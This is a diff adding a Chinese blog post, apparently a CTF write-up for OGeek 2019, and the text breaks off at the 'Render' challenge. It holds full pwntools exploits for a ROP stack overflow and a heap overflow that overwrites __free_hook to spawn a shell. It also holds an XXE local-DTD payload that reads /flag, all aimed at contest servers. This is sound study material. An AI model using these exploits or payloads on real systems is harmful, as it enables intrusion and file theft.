@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Write UP,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="OGeek-CTF WPcatch fun题目描述：oppo catch fun ​        提示：oppo’s phone model，flag{} is required 百度： oppo catch fun  根据提示得到flag flag{Reno} Easy Realworld Challenge 2 *题目描述：flag is in localhost, show me your">
+<meta name="keywords" content="Write UP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="OGeek-CTF WP">
+<meta property="og:url" content="http://yoursite.com/2019/08/27/OGeek_WP/index.html">
+<meta property="og:site_name" content="V&#39;s blog">
+<meta property="og:description" content="OGeek-CTF WPcatch fun题目描述：oppo catch fun ​        提示：oppo’s phone model，flag{} is required 百度： oppo catch fun  根据提示得到flag flag{Reno} Easy Realworld Challenge 2 *题目描述：flag is in localhost, show me your">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566744395057.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566789070936.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566789094683.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566744617867.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566744838904.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566791814833.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566744957290.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566792157110.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566792249505.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566745025562.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566746459168.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566789122210.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566793870950.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566794006869.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566794300675.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566799922178.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566800671679.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566747202519.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566788477725.png">
+<meta property="og:updated_time" content="2019-08-27T03:04:41.310Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="OGeek-CTF WP">
+<meta name="twitter:description" content="OGeek-CTF WPcatch fun题目描述：oppo catch fun ​        提示：oppo’s phone model，flag{} is required 百度： oppo catch fun  根据提示得到flag flag{Reno} Easy Realworld Challenge 2 *题目描述：flag is in localhost, show me your">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/27/OGeek_WP/1566744395057.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/27/OGeek_WP/">
+
+
+
+
+
+  <title>OGeek-CTF WP | V's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">V's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Daily life of a rookie</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/27/OGeek_WP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="V">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">OGeek-CTF WP</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-27T11:02:35+08:00">
+                2019-08-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="OGeek-CTF-WP"><a href="#OGeek-CTF-WP" class="headerlink" title="OGeek-CTF WP"></a>OGeek-CTF WP</h1><h3 id="catch-fun"><a href="#catch-fun" class="headerlink" title="catch fun"></a>catch fun</h3><p>题目描述：oppo catch fun</p>
+<p>​        提示：oppo’s phone model，flag{} is required</p>
+<p>百度： oppo catch fun</p>
+<p><img src="/2019/08/27/OGeek_WP/1566744395057.png" alt="1566744395057"></p>
+<p>根据提示得到flag</p>
+<p>flag{Reno}</p>
+<h3 id="Easy-Realworld-Challenge-2"><a href="#Easy-Realworld-Challenge-2" class="headerlink" title="Easy Realworld Challenge 2 *"></a>Easy Realworld Challenge 2 *</h3><p>题目描述：flag is in localhost, show me your shell!</p>
+<h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><p>题目描述：From the ground up.</p>
+<p>这道题简单看看，strncmp函数可以绕过，v1即比较的长度可以控制，我们可以随意输入一个数字比如1，然后和随机数比较第一个数字，爆破绕过。接着存在栈溢出可能性的函数的溢出长度最大为0xff，且可以由上一个函数的输入来控制。剩下的就是简单的rop了。</p>
+<p>exp脚本如下：</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"><span class="meta">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#p = process(<span class="string">"./babyrop"</span>)</span></span><br><span class="line">p = remote(<span class="string">'47.112.137.238'</span>, <span class="number">13337</span>)</span><br><span class="line">elf = ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">vuln_addr = <span class="number">0x080487D0</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'1'</span>+<span class="string">'\x00'</span>*<span class="number">6</span> + <span class="string">'\xff'</span> + <span class="string">'\n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Correct\n'</span>)</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'\x00'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeaf</span>) + p32(elf.plt[<span class="string">'puts'</span>]) + p32(vuln_addr) + p32(elf.got[<span class="string">'puts'</span>]) + p32(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">libcbase = u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>, <span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="meta">#libcbase = u32(p.recv(4).ljust(4, <span class="string">'\x00'</span>)) - 0x60ca0</span></span><br><span class="line"><span class="built_in">log</span>.info(<span class="string">'libcbase:%#x'</span> %libcbase)</span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="meta">#system_addr = libcbase + 0x3bda0</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x15902b</span></span><br><span class="line">p.<span class="built_in">send</span>(<span class="string">'\x00'</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeaf</span>) + p32(system_addr) + p32(vuln_addr) + p32(bin_sh))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/08/27/OGeek_WP/1566789070936.png" alt="1566789070936"></p>
+<h3 id="book-manager"><a href="#book-manager" class="headerlink" title="book manager"></a>book manager</h3><p>题目描述：Endless book writing.</p>
+<p>简单逆一下，可以很容易找到addtext函数中出现堆溢出，当v7的值小于0x100时，可以往里面写入0x100个字节。于是构造一下堆结构，改写一个text_ptr指向已经释放在unsortedbin中chunk，然后showbook，泄露出libc，然后再利用溢出修改一个text_ptr指向free_hook，改写为system函数地址，然后free一个/bin/sh即可getshell。脚本如下。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'split'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./bookmanager')</span></span><br><span class="line">p = remote(<span class="string">'47.112.115.30'</span>, <span class="number">13337</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddChapter</span><span class="params">(chapterName)</span>:</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Chapter name:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddSection</span><span class="params">(chapterName, sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Which chapter do you want to add into:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line">    sectionAddr = int(p.recvuntil(<span class="string">'\nSection name:'</span>, drop=<span class="literal">True</span>)[<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line">    <span class="keyword">return</span> sectionAddr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddText</span><span class="params">(sectionName, size, text)</span>:</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nWhich section do you want to add into:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line">    p.recvuntil(<span class="string">'\nHow many chapters you want to write:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'\nText:'</span>)</span><br><span class="line">    p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelChapter</span><span class="params">(chapterName)</span>:</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nChapter name:'</span>)</span><br><span class="line">    p.send(chapterName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelSection</span><span class="params">(sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DelText</span><span class="params">(sectionName)</span>:</span></span><br><span class="line">    choose(<span class="number">6</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">    p.send(sectionName)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowBook</span><span class="params">()</span>:</span></span><br><span class="line">    choose(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(flag, oldName, newName)</span>:</span></span><br><span class="line">    choose(<span class="number">8</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\nWhat to update?(Chapter/Section/Text):'</span>)</span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        p.sendline(<span class="string">'Chapter'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nChapter name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Chapter name:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">2</span>:</span><br><span class="line">        p.sendline(<span class="string">'Section'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Section name:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">3</span>:</span><br><span class="line">        p.sendline(<span class="string">'Text'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'\nSection name:'</span>)</span><br><span class="line">        p.send(oldName)</span><br><span class="line">        p.recvuntil(<span class="string">'\nNew Text:'</span>)</span><br><span class="line">        p.send(newName)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Name of the book you want to create: '</span>)</span><br><span class="line">p.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">AddChapter(<span class="string">'cha1'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec1'</span>)</span><br><span class="line">AddText(<span class="string">'sec1'</span>, <span class="number">0x10</span>, <span class="string">'text1'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec2'</span>)</span><br><span class="line">AddText(<span class="string">'sec2'</span>, <span class="number">0x100</span>, <span class="string">'text2'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec3'</span>)</span><br><span class="line">sec4_addr = AddSection(<span class="string">'cha1'</span>, <span class="string">'sec4'</span>)</span><br><span class="line">text4_addr = sec4_addr + <span class="number">0x40</span></span><br><span class="line">AddText(<span class="string">'sec4'</span>, <span class="number">0x90</span>, <span class="string">'text4'</span>)</span><br><span class="line">AddSection(<span class="string">'cha1'</span>, <span class="string">'sec5'</span>)</span><br><span class="line">AddText(<span class="string">'sec5'</span>, <span class="number">0x20</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">DelText(<span class="string">'sec4'</span>)</span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec1'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'sec2'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>) + p64(text4_addr) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">ShowBook()</span><br><span class="line">p.recvuntil(<span class="string">'Section:sec2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'\n      Text:'</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span> </span><br><span class="line">log.info(<span class="string">'libcbase:%#x'</span> %libcbase)</span><br><span class="line">free_hook = libcbase + <span class="number">0x3C67A8</span></span><br><span class="line">system_addr = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec1'</span>, <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(<span class="number">0x0</span>) + p64(<span class="number">0x41</span>) + <span class="string">'sec2'</span>.ljust(<span class="number">0x20</span>, <span class="string">'\x00'</span>) + p64(free_hook) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line"></span><br><span class="line">Update(<span class="number">3</span>, <span class="string">'sec2'</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">DelText(<span class="string">'sec5'</span>)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/08/27/OGeek_WP/1566789094683.png" alt="1566789094683"></p>
+<h3 id="LookAround"><a href="#LookAround" class="headerlink" title="LookAround"></a>LookAround</h3><p>题目描述：builded from tomcat:8-jre8</p>
+<p>进入靶机，f12一波，发现</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./js/_.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>进入：<a href="http://47.107.253.140:18080/webserver/js/_.js" target="_blank" rel="noopener">http://47.107.253.140:18080/webserver/js/_.js</a></p>
+<p>得到</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var data = "<span class="meta">&lt;?xml version=\"1.0\" ?&gt;</span>\n<span class="tag">&lt;<span class="name">request</span>&gt;</span>\n    <span class="tag">&lt;<span class="name">status</span>&gt;</span>1<span class="tag">&lt;/<span class="name">status</span>&gt;</span>\n<span class="tag">&lt;/<span class="name">request</span>&gt;</span>";</span><br><span class="line"></span><br><span class="line">setInterval(function()&#123;</span><br><span class="line">    $.post("callback", data);</span><br><span class="line">&#125;, 10000);</span><br></pre></td></tr></table></figure>
+
+<p>猜测是XXE</p>
+<p>于是进入接口callback</p>
+<p><img src="/2019/08/27/OGeek_WP/1566744617867.png" alt="1566744617867"></p>
+<p>要POST，所以抓包，</p>
+<p>然后不久前学XXE时看到过这篇根据本地DTD来实现XXE的文章</p>
+<p><a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation</a></p>
+<p>于是想在这里试试。</p>
+<p>但是本地有啥DTD文件呢？发现题目给了提示。于是根据题目描述，下载同名镜像，</p>
+<p>给个docker，然后找其中的dtd文件，发现了一个文章中提到的文件</p>
+<p>/usr/share/xml/fontconfig/fonts.dtd</p>
+<p>于是用文章里的payload 一把梭</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE message [</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">local_dtd</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">usr</span>/<span class="attr">share</span>/<span class="attr">xml</span>/<span class="attr">fontconfig</span>/<span class="attr">fonts.dtd</span>"&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">expr</span> '<span class="attr">aaa</span>)&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">flag</span>"&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ENTITY</span> &amp;#<span class="attr">x25</span>; <span class="attr">eval</span> "&lt;!<span class="attr">ENTITY</span> &amp;#<span class="attr">x26</span>;#<span class="attr">x25</span>; <span class="attr">error</span> <span class="attr">SYSTEM</span> &amp;#<span class="attr">x27</span>;<span class="attr">file:</span>///<span class="attr">abcxyz</span>/&amp;#<span class="attr">x25</span>;<span class="attr">file</span>;&amp;#<span class="attr">x27</span>;&gt;</span>"&gt;</span></span><br><span class="line"><span class="xml">        &amp;#x25;eval;</span></span><br><span class="line"><span class="xml">        &amp;#x25;error;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">!ELEMENT</span> <span class="attr">aa</span> (<span class="attr">bb</span>'&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"></span><span class="perl">    %local_dtd;</span><span class="xml"></span></span><br><span class="line"><span class="xml">]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/2019/08/27/OGeek_WP/1566744838904.png" alt="1566744838904"></p>
+<p>flag{f1c6811d4dce2ae37613cee977febe305f4de8fe}</p>
+<h3 id="Render"><a href="#Render" class="headerlink" title="Render"></a>Render</h3><p>题目描述：Write something you want to see.</p>
+<p>进入靶机，f12，发现：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var app = <span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    <span class="keyword">e</span><span class="variable">l:</span> <span class="string">'#app'</span>,</span><br><span class="line">    dat<span class="variable">a:</span> &#123;</span><br><span class="line">        conten<span class="variable">t:</span> <span class="string">''</span>,</span><br><span class="line">        resul<span 